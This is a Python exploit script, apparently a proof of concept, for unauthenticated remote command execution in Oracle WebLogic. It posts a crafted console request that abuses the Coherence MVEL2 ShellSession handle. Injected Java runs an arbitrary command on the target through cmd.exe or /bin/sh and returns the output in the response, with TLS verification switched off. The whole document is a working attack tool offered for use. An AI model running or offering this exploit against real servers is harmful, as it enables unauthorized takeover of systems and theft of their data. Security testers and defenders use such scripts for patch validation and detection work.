#!/usr/bin/env python3

import requests
import sys
from urllib3.exceptions import InsecureRequestWarning

def exploit_weblogic(target_url, command):
    # Disable warnings for insecure HTTPS requests
    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

    # Headers for the exploit request
    headers = {
        'Accept-Charset': 'iso-8859-1,utf-8;q=0.9,*;q=0.1',
        'Accept-Language': 'en',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Connection': 'Close',
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)',
        'Pragma': 'no-cache',
        'Accept': 'image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*',
    }

    # Determine OS command based on the target OS
    os_specific_cmd = f"cmd.exe /c {command}" if "windows" in sys.platform else f"/bin/sh -c {command}"

    # Craft the exploit payload with the custom command
    payload = '_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(' \
              f'"weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();' \
              f'weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();' \
              f'java.lang.reflect.Field field = adapter.getClass().getDeclaredField(\"connectionHandler\");' \
              f'field.setAccessible(true);' \
              f'Object obj = field.get(adapter);' \
              f'weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) ' \
              f'obj.getClass().getMethod(\"getServletRequest\").invoke(obj);' \
              f'String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? ' \
              f'new String[]{{\"cmd.exe\", \"/c\", \"{command}\"}} : new String[]{{\"/bin/sh\", \"-c\", \"{command}\"}};' \
              f'String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(\"\\\\A\").next();' \
              f'weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) ' \
              f'req.getClass().getMethod(\"getResponse\").invoke(req);' \
              f'res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));' \
              f'res.getServletOutputStream().flush();' \
              f'res.getWriter().write(\"\");' \
              f'executeThread.interrupt();")'

    # Make the exploit request
    response = requests.post(target_url, data=payload, headers=headers, verify=False)

    # Check the response
    if response.status_code == 200:
        print("Exploit sent successfully. Check the target for command output.")
    else:
        print(f"Failed to send exploit. HTTP Response Code: {response.status_code}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 exploit.py <target-url> <command>")
        print("Example: python3 exploit.py http://192.168.1.100:7001 \"id\"")
    else:
        target = sys.argv[1]
        cmd = sys.argv[2]
        exploit_weblogic(target, cmd)
